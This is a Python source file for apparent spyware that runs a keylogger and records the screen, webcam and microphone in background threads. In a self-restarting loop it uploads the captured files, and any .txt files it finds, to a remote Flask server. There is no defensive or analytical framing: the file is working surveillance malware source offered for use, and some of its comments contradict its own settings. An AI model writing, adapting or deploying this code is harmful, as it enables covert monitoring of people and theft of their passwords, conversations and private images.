import socket
import threading
import os
import sys
import glob
import time
import datetime
import requests
import numpy as np
import pyautogui
import keyboard
import pyaudio
import wave
from threading import Timer
import cv2  # Ensure OpenCV is imported

# Server details
FLASK_SERVER_URL = "http://127.0.0.1:5000/upload"  # Change this to your Flask server URL
UPLOAD_INTERVAL = 120  # Set the upload interval to 178 seconds for testing

uploaded_files = set()
kl = None  # Keylogger will be initialized later
screen_recording_thread = None
video_recording_thread = None
audio_thread = None

# Get a timestamp for unique filenames
def get_timestamp():
    return datetime.datetime.now().strftime('%Y%m%d%H%M%S')

# Keylogger class
class Keylogger:
    SEND_REPORT_EVERY = 60  # in seconds

    def __init__(self, interval=SEND_REPORT_EVERY, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.datetime.now()
        self.end_dt = datetime.datetime.now()
        self.timer = None

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_file(self):
        filename = f"keylog-{self.start_dt.strftime('%Y%m%d%H%M%S')}_{self.end_dt.strftime('%Y%m%d%H%M%S')}.txt"
        with open(filename, "w") as f:
            f.write(self.log)
        print(f"[+] Saved {filename}")

    def report(self):
        self.end_dt = datetime.datetime.now()
        if self.log:
            self.report_to_file()
            self.start_dt = datetime.datetime.now()
            self.log = ""
        self.timer = Timer(self.interval, self.report)
        self.timer.start()

    def start(self):
        self.timer = Timer(self.interval, self.report)
        self.timer.start()
        keyboard.on_release(self.callback)

    def stop(self):
        if self.timer:
            self.timer.cancel()
        keyboard.unhook_all()

# Video recording functions
stop_video_recording = False

def record_video(output_file=f"webcam_{get_timestamp()}.avi"):
    global stop_video_recording
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(output_file, fourcc, 20.0, (640, 480))

    while not stop_video_recording:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)

    cap.release()
    out.release()
    cv2.destroyAllWindows()

def stop_video_recording_func():
    global stop_video_recording
    stop_video_recording = True

# Screen recording functions
stop_screen_recording = False

def start_screen_recording(output_file=f"screenrecord_{get_timestamp()}.avi"):
    global stop_screen_recording
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(output_file, fourcc, 20.0, screen_size)

    while not stop_screen_recording:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)

    out.release()

def stop_screen_recording_func():
    global stop_screen_recording
    stop_screen_recording = True

# Audio recording functions
def get_audio_filename():
    """Generate a unique filename based on timestamp."""
    return f"audio_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.wav"

def record_audio(output_filename="audio.wav", record_seconds=55):
    """Record audio for a specified duration and save it to the given filename."""
    chunk = 1024  # Record in chunks of 1024 samples
    format = pyaudio.paInt16  # 16-bit audio format
    channels = 1  # Mono audio
    sample_rate = 44100  # Standard sample rate

    # Initialize PyAudio
    p = pyaudio.PyAudio()
    stream = p.open(format=format, channels=channels, rate=sample_rate, input=True, frames_per_buffer=chunk)

    print(f"Recording audio to {output_filename}...")
    frames = []
    for _ in range(int(sample_rate / chunk * record_seconds)):
        data = stream.read(chunk)
        frames.append(data)

    # Stop and close the stream
    stream.stop_stream()
    stream.close()
    p.terminate()

    # Save the recorded audio to a .wav file
    with wave.open(output_filename, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(format))
        wf.setframerate(sample_rate)
        wf.writeframes(b''.join(frames))
    
    print(f"Finished recording audio to {output_filename}.")
    return output_filename

def handle_start_screen_recording():
    global screen_recording_thread
    screen_filename = f"screenrecord_{get_timestamp()}.avi"
    if not screen_recording_thread or not screen_recording_thread.is_alive():
        screen_recording_thread = threading.Thread(target=start_screen_recording, args=(screen_filename,), daemon=True)
        screen_recording_thread.start()

def handle_start_video_recording():
    global video_recording_thread
    video_filename = f"webcam_{get_timestamp()}.avi"
    if not video_recording_thread or not video_recording_thread.is_alive():
        video_recording_thread = threading.Thread(target=record_video, args=(video_filename,), daemon=True)
        video_recording_thread.start()

def handle_start_audio_recording():
    audio_filename = get_audio_filename()
    global audio_thread
    if audio_thread is None or not audio_thread.is_alive():
        audio_thread = threading.Thread(target=record_audio, args=(audio_filename,), daemon=True)
        audio_thread.start()

def shutdown_client():
    """Shuts down the client cleanly, ensuring all resources are closed."""
    try:
        if kl is not None:
            kl.stop()
        if screen_recording_thread is not None:
            stop_screen_recording_func()
        if video_recording_thread is not None:
            stop_video_recording_func()
    finally:
        sys.exit(0)

# Function to upload files to Flask server
def upload_files_to_server():
    global uploaded_files
    files_to_upload = glob.glob("screenrecord_*.avi") + glob.glob("webcam_*.avi") + glob.glob("audio_*.wav") + glob.glob("*.txt")
    for file_path in files_to_upload:
        if os.path.exists(file_path):
            file_mod_time = os.path.getmtime(file_path)
            file_identifier = (file_path, file_mod_time)
            if file_identifier in uploaded_files:
                print(f"{file_path} already uploaded, skipping.")
                continue
            try:
                with open(file_path, 'rb') as f:
                    response = requests.post(FLASK_SERVER_URL, files={'file': f})
                    if response.status_code == 200:
                        print(f"Uploaded {file_path} successfully.")
                        uploaded_files.add(file_identifier)
                    else:
                        print(f"Failed to upload {file_path}: {response.status_code}")
            except Exception as e:
                print(f"Error uploading {file_path}: {str(e)}")

# Function to delete old files
def delete_old_files(directory="."):
    current_time = time.time()
    expiration_time = 45  # Files older than 120 seconds
    file_patterns = ["screenrecord_*.avi", "webcam_*.avi", "audio_*.wav", "keylog_*.txt"]
    for pattern in file_patterns:
        for file_path in glob.glob(os.path.join(directory, pattern)):
            if os.path.isfile(file_path) and current_time - os.path.getctime(file_path) > expiration_time:
                try:
                    os.remove(file_path)
                    print(f"Deleted old file: {file_path}")
                except Exception as e:
                    print(f"Error deleting {file_path}: {str(e)}")

# Main loop to handle recordings, uploads, and deletions
def start_auto_record_upload():
    while True:
        # Delete old files before starting new recordings
        delete_old_files()

        # Start new recordings
        handle_start_screen_recording()
        handle_start_video_recording()
        handle_start_audio_recording()

        # Wait for the recording interval
        time.sleep(UPLOAD_INTERVAL)
        
        # Stop recordings
        stop_screen_recording_func()
        stop_video_recording_func()

        # Upload files to the server
        upload_files_to_server()

# Thread for automatic recording, uploading, and deleting
upload_thread = threading.Thread(target=start_auto_record_upload, daemon=True)
upload_thread.start()

def restart():
    """Restarts the executable if compiled into an .exe"""
    print("Restarting client...")
    os.execl(sys.executable, sys.executable, *sys.argv)

if __name__ == "__main__":
    print("Client is running and automatically uploading files every 178 seconds.")

    # Initialize keylogger and start it
    kl = Keylogger()
    kl.start()

    # Wait and restart to ensure recording restarts properly
    time.sleep(UPLOAD_INTERVAL)
    delete_old_files()
    restart()
